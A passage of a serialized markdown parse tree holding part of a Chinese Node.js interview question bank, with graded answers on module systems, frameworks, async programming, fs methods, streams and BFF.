CommonJS模块化：使用`require`和`module.exports`进行模块导入和导出。\\n\\n","task":false,"loose":true,"text":"CommonJS模块化：使用`require`和`module.exports`进行模块导入和导出。\\n","tokens":[{"type":"text","raw":"CommonJS模块化：使用`require`和`module.exports`进行模块导入和导出。\\n","text":"CommonJS模块化：使用`require`和`module.exports`进行模块导入和导出。","tokens":[{"type":"text","raw":"CommonJS模块化：使用","text":"CommonJS模块化：使用","escaped":false},{"type":"codespan","raw":"`require`","text":"require"},{"type":"text","raw":"和","text":"和","escaped":false},{"type":"codespan","raw":"`module.exports`","text":"module.exports"},{"type":"text","raw":"进行模块导入和导出。","text":"进行模块导入和导出。","escaped":false}]}]},{"type":"list_item","raw":"- ES6模块化：使用`import`和`export`进行模块导入和导出。\\n\\n","task":false,"loose":true,"text":"ES6模块化：使用`import`和`export`进行模块导入和导出。\\n","tokens":[{"type":"text","raw":"ES6模块化：使用`import`和`export`进行模块导入和导出。\\n","text":"ES6模块化：使用`import`和`export`进行模块导入和导出。","tokens":[{"type":"text","raw":"ES6模块化：使用","text":"ES6模块化：使用","escaped":false},{"type":"codespan","raw":"`import`","text":"import"},{"type":"text","raw":"和","text":"和","escaped":false},{"type":"codespan","raw":"`export`","text":"export"},{"type":"text","raw":"进行模块导入和导出。","text":"进行模块导入和导出。","escaped":false}]}]},{"type":"list_item","raw":"- AMD模块化：使用`define`和`require`进行模块导入和导出。\\n\\n","task":false,"loose":true,"text":"AMD模块化：使用`define`和`require`进行模块导入和导出。\\n","tokens":[{"type":"text","raw":"AMD模块化：使用`define`和`require`进行模块导入和导出。\\n","text":"AMD模块化：使用`define`和`require`进行模块导入和导出。","tokens":[{"type":"text","raw":"AMD模块化：使用","text":"AMD模块化：使用","escaped":false},{"type":"codespan","raw":"`define`","text":"define"},{"type":"text","raw":"和","text":"和","escaped":false},{"type":"codespan","raw":"`require`","text":"require"},{"type":"text","raw":"进行模块导入和导出。","text":"进行模块导入和导出。","escaped":false}]}]},{"type":"list_item","raw":"- UMD模块化：兼容CommonJS和AMD模块化。\\n\\n","task":false,"loose":true,"text":"UMD模块化：兼容CommonJS和AMD模块化。\\n","tokens":[{"type":"text","raw":"UMD模块化：兼容CommonJS和AMD模块化。\\n","text":"UMD模块化：兼容CommonJS和AMD模块化。","tokens":[{"type":"text","raw":"UMD模块化：兼容CommonJS和AMD模块化。","text":"UMD模块化：兼容CommonJS和AMD模块化。","escaped":false}]}]},{"type":"list_item","raw":"- 全局变量：将变量挂载到`global`对象上，方便全局访问。\\n\\n","task":false,"loose":true,"text":"全局变量：将变量挂载到`global`对象上，方便全局访问。\\n","tokens":[{"type":"text","raw":"全局变量：将变量挂载到`global`对象上，方便全局访问。\\n","text":"全局变量：将变量挂载到`global`对象上，方便全局访问。","tokens":[{"type":"text","raw":"全局变量：将变量挂载到","text":"全局变量：将变量挂载到","escaped":false},{"type":"codespan","raw":"`global`","text":"global"},{"type":"text","raw":"对象上，方便全局访问。","text":"对象上，方便全局访问。","escaped":false}]}]},{"type":"list_item","raw":"- 命名空间：将变量挂载到命名空间对象上，避免全局变量污染。\\n\\n","task":false,"loose":true,"text":"命名空间：将变量挂载到命名空间对象上，避免全局变量污染。\\n","tokens":[{"type":"text","raw":"命名空间：将变量挂载到命名空间对象上，避免全局变量污染。\\n","text":"命名空间：将变量挂载到命名空间对象上，避免全局变量污染。","tokens":[{"type":"text","raw":"命名空间：将变量挂载到命名空间对象上，避免全局变量污染。","text":"命名空间：将变量挂载到命名空间对象上，避免全局变量污染。","escaped":false}]}]},{"type":"list_item","raw":"- 模块打包：使用Webpack、Rollup等工具将模块打包成一个文件，方便部署和分发。","task":false,"loose":true,"text":"模块打包：使用Webpack、Rollup等工具将模块打包成一个文件，方便部署和分发。","tokens":[{"type":"text","raw":"模块打包：使用Webpack、Rollup等工具将模块打包成一个文件，方便部署和分发。","text":"模块打包：使用Webpack、Rollup等工具将模块打包成一个文件，方便部署和分发。","tokens":[{"type":"text","raw":"模块打包：使用Webpack、Rollup等工具将模块打包成一个文件，方便部署和分发。","text":"模块打包：使用Webpack、Rollup等工具将模块打包成一个文件，方便部署和分发。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 6. 讲一下常见的Nodejs框架？\\n\\n","depth":2,"text":"6. 讲一下常见的Nodejs框架？","tokens":[{"type":"text","raw":"6. 讲一下常见的Nodejs框架？","text":"6. 讲一下常见的Nodejs框架？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- Koa：一个轻量的Nodejs框架，代码非常简洁。采用洋葱圈模型中间件，非常方便扩展功能，但是开发后端API需要进行再封装。\\n\\n- Express：Express也是一个轻量框架，Express和Koa的区别在于中间件机制。但总体差别不是很大，绝大多数Nodejs框架都是在Koa或者Express基础上封装的。\\n\\n- Eggjs：基于Koa封装的框架，整合了数据库、路由、安全防护、日志记录、异常处理等中间件，可以用来快速开发Rest或者Restful API项目。\\n\\n- Nestjs：基于TS,使用了大量的装饰器语法，开发体验类似于Java的Springboot。除此之外，Nestjs还提供了GraphQL、WebSocket、各种MQ和微服务的解决方案，比较适合大型后端项目的开发。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Koa：一个轻量的Nodejs框架，代码非常简洁。采用洋葱圈模型中间件，非常方便扩展功能，但是开发后端API需要进行再封装。\\n\\n","task":false,"loose":true,"text":"Koa：一个轻量的Nodejs框架，代码非常简洁。采用洋葱圈模型中间件，非常方便扩展功能，但是开发后端API需要进行再封装。\\n","tokens":[{"type":"text","raw":"Koa：一个轻量的Nodejs框架，代码非常简洁。采用洋葱圈模型中间件，非常方便扩展功能，但是开发后端API需要进行再封装。\\n","text":"Koa：一个轻量的Nodejs框架，代码非常简洁。采用洋葱圈模型中间件，非常方便扩展功能，但是开发后端API需要进行再封装。","tokens":[{"type":"text","raw":"Koa：一个轻量的Nodejs框架，代码非常简洁。采用洋葱圈模型中间件，非常方便扩展功能，但是开发后端API需要进行再封装。","text":"Koa：一个轻量的Nodejs框架，代码非常简洁。采用洋葱圈模型中间件，非常方便扩展功能，但是开发后端API需要进行再封装。","escaped":false}]}]},{"type":"list_item","raw":"- Express：Express也是一个轻量框架，Express和Koa的区别在于中间件机制。但总体差别不是很大，绝大多数Nodejs框架都是在Koa或者Express基础上封装的。\\n\\n","task":false,"loose":true,"text":"Express：Express也是一个轻量框架，Express和Koa的区别在于中间件机制。但总体差别不是很大，绝大多数Nodejs框架都是在Koa或者Express基础上封装的。\\n","tokens":[{"type":"text","raw":"Express：Express也是一个轻量框架，Express和Koa的区别在于中间件机制。但总体差别不是很大，绝大多数Nodejs框架都是在Koa或者Express基础上封装的。\\n","text":"Express：Express也是一个轻量框架，Express和Koa的区别在于中间件机制。但总体差别不是很大，绝大多数Nodejs框架都是在Koa或者Express基础上封装的。","tokens":[{"type":"text","raw":"Express：Express也是一个轻量框架，Express和Koa的区别在于中间件机制。但总体差别不是很大，绝大多数Nodejs框架都是在Koa或者Express基础上封装的。","text":"Express：Express也是一个轻量框架，Express和Koa的区别在于中间件机制。但总体差别不是很大，绝大多数Nodejs框架都是在Koa或者Express基础上封装的。","escaped":false}]}]},{"type":"list_item","raw":"- Eggjs：基于Koa封装的框架，整合了数据库、路由、安全防护、日志记录、异常处理等中间件，可以用来快速开发Rest或者Restful API项目。\\n\\n","task":false,"loose":true,"text":"Eggjs：基于Koa封装的框架，整合了数据库、路由、安全防护、日志记录、异常处理等中间件，可以用来快速开发Rest或者Restful API项目。\\n","tokens":[{"type":"text","raw":"Eggjs：基于Koa封装的框架，整合了数据库、路由、安全防护、日志记录、异常处理等中间件，可以用来快速开发Rest或者Restful API项目。\\n","text":"Eggjs：基于Koa封装的框架，整合了数据库、路由、安全防护、日志记录、异常处理等中间件，可以用来快速开发Rest或者Restful API项目。","tokens":[{"type":"text","raw":"Eggjs：基于Koa封装的框架，整合了数据库、路由、安全防护、日志记录、异常处理等中间件，可以用来快速开发Rest或者Restful API项目。","text":"Eggjs：基于Koa封装的框架，整合了数据库、路由、安全防护、日志记录、异常处理等中间件，可以用来快速开发Rest或者Restful API项目。","escaped":false}]}]},{"type":"list_item","raw":"- Nestjs：基于TS,使用了大量的装饰器语法，开发体验类似于Java的Springboot。除此之外，Nestjs还提供了GraphQL、WebSocket、各种MQ和微服务的解决方案，比较适合大型后端项目的开发。","task":false,"loose":true,"text":"Nestjs：基于TS,使用了大量的装饰器语法，开发体验类似于Java的Springboot。除此之外，Nestjs还提供了GraphQL、WebSocket、各种MQ和微服务的解决方案，比较适合大型后端项目的开发。","tokens":[{"type":"text","raw":"Nestjs：基于TS,使用了大量的装饰器语法，开发体验类似于Java的Springboot。除此之外，Nestjs还提供了GraphQL、WebSocket、各种MQ和微服务的解决方案，比较适合大型后端项目的开发。","text":"Nestjs：基于TS,使用了大量的装饰器语法，开发体验类似于Java的Springboot。除此之外，Nestjs还提供了GraphQL、WebSocket、各种MQ和微服务的解决方案，比较适合大型后端项目的开发。","tokens":[{"type":"text","raw":"Nestjs：基于TS,使用了大量的装饰器语法，开发体验类似于Java的Springboot。除此之外，Nestjs还提供了GraphQL、WebSocket、各种MQ和微服务的解决方案，比较适合大型后端项目的开发。","text":"Nestjs：基于TS,使用了大量的装饰器语法，开发体验类似于Java的Springboot。除此之外，Nestjs还提供了GraphQL、WebSocket、各种MQ和微服务的解决方案，比较适合大型后端项目的开发。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 7. Nodejs的异步编程有哪些方法？\\n\\n","depth":2,"text":"7. Nodejs的异步编程有哪些方法？","tokens":[{"type":"text","raw":"7. Nodejs的异步编程有哪些方法？","text":"7. Nodejs的异步编程有哪些方法？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"Node.js的异步编程有以下几种方法：","text":"Node.js的异步编程有以下几种方法：","tokens":[{"type":"text","raw":"Node.js的异步编程有以下几种方法：","text":"Node.js的异步编程有以下几种方法：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 回调函数：将异步操作的结果作为回调函数的参数传递给回调函数。\\n\\n- Promise：将异步操作的结果封装成一个Promise对象，通过then和catch方法处理异步操作的结果。\\n\\n- async/await：将异步操作的结果封装成一个Promise对象，通过await关键字等待异步操作的结果。\\n\\n- Generator：将异步操作的结果封装成一个Generator对象，通过yield关键字等待异步操作的结果。\\n\\n- 流程控制库：如`async`、`bluebird`、`co`等库，提供了更方便的异步编程方式。\\n\\n- 事件驱动：通过事件驱动的方式处理异步操作，如`EventEmitter`、`Stream`等。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 回调函数：将异步操作的结果作为回调函数的参数传递给回调函数。\\n\\n","task":false,"loose":true,"text":"回调函数：将异步操作的结果作为回调函数的参数传递给回调函数。\\n","tokens":[{"type":"text","raw":"回调函数：将异步操作的结果作为回调函数的参数传递给回调函数。\\n","text":"回调函数：将异步操作的结果作为回调函数的参数传递给回调函数。","tokens":[{"type":"text","raw":"回调函数：将异步操作的结果作为回调函数的参数传递给回调函数。","text":"回调函数：将异步操作的结果作为回调函数的参数传递给回调函数。","escaped":false}]}]},{"type":"list_item","raw":"- Promise：将异步操作的结果封装成一个Promise对象，通过then和catch方法处理异步操作的结果。\\n\\n","task":false,"loose":true,"text":"Promise：将异步操作的结果封装成一个Promise对象，通过then和catch方法处理异步操作的结果。\\n","tokens":[{"type":"text","raw":"Promise：将异步操作的结果封装成一个Promise对象，通过then和catch方法处理异步操作的结果。\\n","text":"Promise：将异步操作的结果封装成一个Promise对象，通过then和catch方法处理异步操作的结果。","tokens":[{"type":"text","raw":"Promise：将异步操作的结果封装成一个Promise对象，通过then和catch方法处理异步操作的结果。","text":"Promise：将异步操作的结果封装成一个Promise对象，通过then和catch方法处理异步操作的结果。","escaped":false}]}]},{"type":"list_item","raw":"- async/await：将异步操作的结果封装成一个Promise对象，通过await关键字等待异步操作的结果。\\n\\n","task":false,"loose":true,"text":"async/await：将异步操作的结果封装成一个Promise对象，通过await关键字等待异步操作的结果。\\n","tokens":[{"type":"text","raw":"async/await：将异步操作的结果封装成一个Promise对象，通过await关键字等待异步操作的结果。\\n","text":"async/await：将异步操作的结果封装成一个Promise对象，通过await关键字等待异步操作的结果。","tokens":[{"type":"text","raw":"async/await：将异步操作的结果封装成一个Promise对象，通过await关键字等待异步操作的结果。","text":"async/await：将异步操作的结果封装成一个Promise对象，通过await关键字等待异步操作的结果。","escaped":false}]}]},{"type":"list_item","raw":"- Generator：将异步操作的结果封装成一个Generator对象，通过yield关键字等待异步操作的结果。\\n\\n","task":false,"loose":true,"text":"Generator：将异步操作的结果封装成一个Generator对象，通过yield关键字等待异步操作的结果。\\n","tokens":[{"type":"text","raw":"Generator：将异步操作的结果封装成一个Generator对象，通过yield关键字等待异步操作的结果。\\n","text":"Generator：将异步操作的结果封装成一个Generator对象，通过yield关键字等待异步操作的结果。","tokens":[{"type":"text","raw":"Generator：将异步操作的结果封装成一个Generator对象，通过yield关键字等待异步操作的结果。","text":"Generator：将异步操作的结果封装成一个Generator对象，通过yield关键字等待异步操作的结果。","escaped":false}]}]},{"type":"list_item","raw":"- 流程控制库：如`async`、`bluebird`、`co`等库，提供了更方便的异步编程方式。\\n\\n","task":false,"loose":true,"text":"流程控制库：如`async`、`bluebird`、`co`等库，提供了更方便的异步编程方式。\\n","tokens":[{"type":"text","raw":"流程控制库：如`async`、`bluebird`、`co`等库，提供了更方便的异步编程方式。\\n","text":"流程控制库：如`async`、`bluebird`、`co`等库，提供了更方便的异步编程方式。","tokens":[{"type":"text","raw":"流程控制库：如","text":"流程控制库：如","escaped":false},{"type":"codespan","raw":"`async`","text":"async"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`bluebird`","text":"bluebird"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`co`","text":"co"},{"type":"text","raw":"等库，提供了更方便的异步编程方式。","text":"等库，提供了更方便的异步编程方式。","escaped":false}]}]},{"type":"list_item","raw":"- 事件驱动：通过事件驱动的方式处理异步操作，如`EventEmitter`、`Stream`等。","task":false,"loose":true,"text":"事件驱动：通过事件驱动的方式处理异步操作，如`EventEmitter`、`Stream`等。","tokens":[{"type":"text","raw":"事件驱动：通过事件驱动的方式处理异步操作，如`EventEmitter`、`Stream`等。","text":"事件驱动：通过事件驱动的方式处理异步操作，如`EventEmitter`、`Stream`等。","tokens":[{"type":"text","raw":"事件驱动：通过事件驱动的方式处理异步操作，如","text":"事件驱动：通过事件驱动的方式处理异步操作，如","escaped":false},{"type":"codespan","raw":"`EventEmitter`","text":"EventEmitter"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`Stream`","text":"Stream"},{"type":"text","raw":"等。","text":"等。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 8. Nodejs的文件系统有哪些方法？\\n\\n","depth":2,"text":"8. Nodejs的文件系统有哪些方法？","tokens":[{"type":"text","raw":"8. Nodejs的文件系统有哪些方法？","text":"8. Nodejs的文件系统有哪些方法？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"Node.js的文件系统有以下几种方法：","text":"Node.js的文件系统有以下几种方法：","tokens":[{"type":"text","raw":"Node.js的文件系统有以下几种方法：","text":"Node.js的文件系统有以下几种方法：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- `fs.readFile`：读取文件内容。\\n\\n- `fs.writeFile`：写入文件内容。\\n\\n- `fs.appendFile`：追加文件内容。\\n\\n- `fs.unlink`：删除文件。\\n\\n- `fs.rename`：重命名文件。\\n\\n- `fs.stat`：获取文件信息。\\n\\n- `fs.readdir`：读取目录内容。\\n\\n- `fs.mkdir`：创建目录。\\n\\n- `fs.rmdir`：删除目录。\\n\\n- `fs.watch`：监听文件或目录的变化。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- `fs.readFile`：读取文件内容。\\n\\n","task":false,"loose":true,"text":"`fs.readFile`：读取文件内容。\\n","tokens":[{"type":"text","raw":"`fs.readFile`：读取文件内容。\\n","text":"`fs.readFile`：读取文件内容。","tokens":[{"type":"codespan","raw":"`fs.readFile`","text":"fs.readFile"},{"type":"text","raw":"：读取文件内容。","text":"：读取文件内容。","escaped":false}]}]},{"type":"list_item","raw":"- `fs.writeFile`：写入文件内容。\\n\\n","task":false,"loose":true,"text":"`fs.writeFile`：写入文件内容。\\n","tokens":[{"type":"text","raw":"`fs.writeFile`：写入文件内容。\\n","text":"`fs.writeFile`：写入文件内容。","tokens":[{"type":"codespan","raw":"`fs.writeFile`","text":"fs.writeFile"},{"type":"text","raw":"：写入文件内容。","text":"：写入文件内容。","escaped":false}]}]},{"type":"list_item","raw":"- `fs.appendFile`：追加文件内容。\\n\\n","task":false,"loose":true,"text":"`fs.appendFile`：追加文件内容。\\n","tokens":[{"type":"text","raw":"`fs.appendFile`：追加文件内容。\\n","text":"`fs.appendFile`：追加文件内容。","tokens":[{"type":"codespan","raw":"`fs.appendFile`","text":"fs.appendFile"},{"type":"text","raw":"：追加文件内容。","text":"：追加文件内容。","escaped":false}]}]},{"type":"list_item","raw":"- `fs.unlink`：删除文件。\\n\\n","task":false,"loose":true,"text":"`fs.unlink`：删除文件。\\n","tokens":[{"type":"text","raw":"`fs.unlink`：删除文件。\\n","text":"`fs.unlink`：删除文件。","tokens":[{"type":"codespan","raw":"`fs.unlink`","text":"fs.unlink"},{"type":"text","raw":"：删除文件。","text":"：删除文件。","escaped":false}]}]},{"type":"list_item","raw":"- `fs.rename`：重命名文件。\\n\\n","task":false,"loose":true,"text":"`fs.rename`：重命名文件。\\n","tokens":[{"type":"text","raw":"`fs.rename`：重命名文件。\\n","text":"`fs.rename`：重命名文件。","tokens":[{"type":"codespan","raw":"`fs.rename`","text":"fs.rename"},{"type":"text","raw":"：重命名文件。","text":"：重命名文件。","escaped":false}]}]},{"type":"list_item","raw":"- `fs.stat`：获取文件信息。\\n\\n","task":false,"loose":true,"text":"`fs.stat`：获取文件信息。\\n","tokens":[{"type":"text","raw":"`fs.stat`：获取文件信息。\\n","text":"`fs.stat`：获取文件信息。","tokens":[{"type":"codespan","raw":"`fs.stat`","text":"fs.stat"},{"type":"text","raw":"：获取文件信息。","text":"：获取文件信息。","escaped":false}]}]},{"type":"list_item","raw":"- `fs.readdir`：读取目录内容。\\n\\n","task":false,"loose":true,"text":"`fs.readdir`：读取目录内容。\\n","tokens":[{"type":"text","raw":"`fs.readdir`：读取目录内容。\\n","text":"`fs.readdir`：读取目录内容。","tokens":[{"type":"codespan","raw":"`fs.readdir`","text":"fs.readdir"},{"type":"text","raw":"：读取目录内容。","text":"：读取目录内容。","escaped":false}]}]},{"type":"list_item","raw":"- `fs.mkdir`：创建目录。\\n\\n","task":false,"loose":true,"text":"`fs.mkdir`：创建目录。\\n","tokens":[{"type":"text","raw":"`fs.mkdir`：创建目录。\\n","text":"`fs.mkdir`：创建目录。","tokens":[{"type":"codespan","raw":"`fs.mkdir`","text":"fs.mkdir"},{"type":"text","raw":"：创建目录。","text":"：创建目录。","escaped":false}]}]},{"type":"list_item","raw":"- `fs.rmdir`：删除目录。\\n\\n","task":false,"loose":true,"text":"`fs.rmdir`：删除目录。\\n","tokens":[{"type":"text","raw":"`fs.rmdir`：删除目录。\\n","text":"`fs.rmdir`：删除目录。","tokens":[{"type":"codespan","raw":"`fs.rmdir`","text":"fs.rmdir"},{"type":"text","raw":"：删除目录。","text":"：删除目录。","escaped":false}]}]},{"type":"list_item","raw":"- `fs.watch`：监听文件或目录的变化。","task":false,"loose":true,"text":"`fs.watch`：监听文件或目录的变化。","tokens":[{"type":"text","raw":"`fs.watch`：监听文件或目录的变化。","text":"`fs.watch`：监听文件或目录的变化。","tokens":[{"type":"codespan","raw":"`fs.watch`","text":"fs.watch"},{"type":"text","raw":"：监听文件或目录的变化。","text":"：监听文件或目录的变化。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 9. 什么是Stream流，有哪些应用场景？\\n\\n","depth":2,"text":"9. 什么是Stream流，有哪些应用场景？","tokens":[{"type":"text","raw":"9. 什么是Stream流，有哪些应用场景？","text":"9. 什么是Stream流，有哪些应用场景？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- Stream是一种处理流式数据的抽象接口，用于读取、写入、转换和操作数据流。它是一个基于事件的 API，可以让我们以高效、低延迟的方式处理大型数据集。\\n\\n- 比如读取文件，使用流我们可以一点一点来读取文件，每次只读取或写入文件的一小部分数据块，而不是一次性将整个文件读取或写入到内存中或磁盘中，这样做能够降低内存占用。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Stream是一种处理流式数据的抽象接口，用于读取、写入、转换和操作数据流。它是一个基于事件的 API，可以让我们以高效、低延迟的方式处理大型数据集。\\n\\n","task":false,"loose":true,"text":"Stream是一种处理流式数据的抽象接口，用于读取、写入、转换和操作数据流。它是一个基于事件的 API，可以让我们以高效、低延迟的方式处理大型数据集。\\n","tokens":[{"type":"text","raw":"Stream是一种处理流式数据的抽象接口，用于读取、写入、转换和操作数据流。它是一个基于事件的 API，可以让我们以高效、低延迟的方式处理大型数据集。\\n","text":"Stream是一种处理流式数据的抽象接口，用于读取、写入、转换和操作数据流。它是一个基于事件的 API，可以让我们以高效、低延迟的方式处理大型数据集。","tokens":[{"type":"text","raw":"Stream是一种处理流式数据的抽象接口，用于读取、写入、转换和操作数据流。它是一个基于事件的 API，可以让我们以高效、低延迟的方式处理大型数据集。","text":"Stream是一种处理流式数据的抽象接口，用于读取、写入、转换和操作数据流。它是一个基于事件的 API，可以让我们以高效、低延迟的方式处理大型数据集。","escaped":false}]}]},{"type":"list_item","raw":"- 比如读取文件，使用流我们可以一点一点来读取文件，每次只读取或写入文件的一小部分数据块，而不是一次性将整个文件读取或写入到内存中或磁盘中，这样做能够降低内存占用。","task":false,"loose":true,"text":"比如读取文件，使用流我们可以一点一点来读取文件，每次只读取或写入文件的一小部分数据块，而不是一次性将整个文件读取或写入到内存中或磁盘中，这样做能够降低内存占用。","tokens":[{"type":"text","raw":"比如读取文件，使用流我们可以一点一点来读取文件，每次只读取或写入文件的一小部分数据块，而不是一次性将整个文件读取或写入到内存中或磁盘中，这样做能够降低内存占用。","text":"比如读取文件，使用流我们可以一点一点来读取文件，每次只读取或写入文件的一小部分数据块，而不是一次性将整个文件读取或写入到内存中或磁盘中，这样做能够降低内存占用。","tokens":[{"type":"text","raw":"比如读取文件，使用流我们可以一点一点来读取文件，每次只读取或写入文件的一小部分数据块，而不是一次性将整个文件读取或写入到内存中或磁盘中，这样做能够降低内存占用。","text":"比如读取文件，使用流我们可以一点一点来读取文件，每次只读取或写入文件的一小部分数据块，而不是一次性将整个文件读取或写入到内存中或磁盘中，这样做能够降低内存占用。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 10. 什么是BFF？\\n\\n","depth":2,"text":"10. 什么是BFF？","tokens":[{"type":"text","raw":"10. 什么是BFF？","text":"10. 什么是BFF？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- BFF（Backend For Frontend）是中间层，由前端同学开发的后端项目。\\n\\n- 最常见的BFF项目像SSR和GraphQL。SSR用来解决SEO问题，GraphQL用来聚合数据，解决API查询的问题。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- BFF（Backend For Frontend）是中间层，由前端同学开发的后端项目。\\n\\n","task":false,"loose":true,"text":"BFF（Backend For Frontend）是中间层，由前端同学开发的后端项目。\\n","tokens":[{"type":"text","raw":"BFF（Backend For Frontend）是中间层，由前端同学开发的后端项目。\\n","text":"BFF（Backend For Frontend）是中间层，由前端同学开发的后端项目。","tokens":[{"type":"text","raw":"BFF（Backend For Frontend）是中间层，由前端同学开发的后端项目。","text":"BFF（Backend For 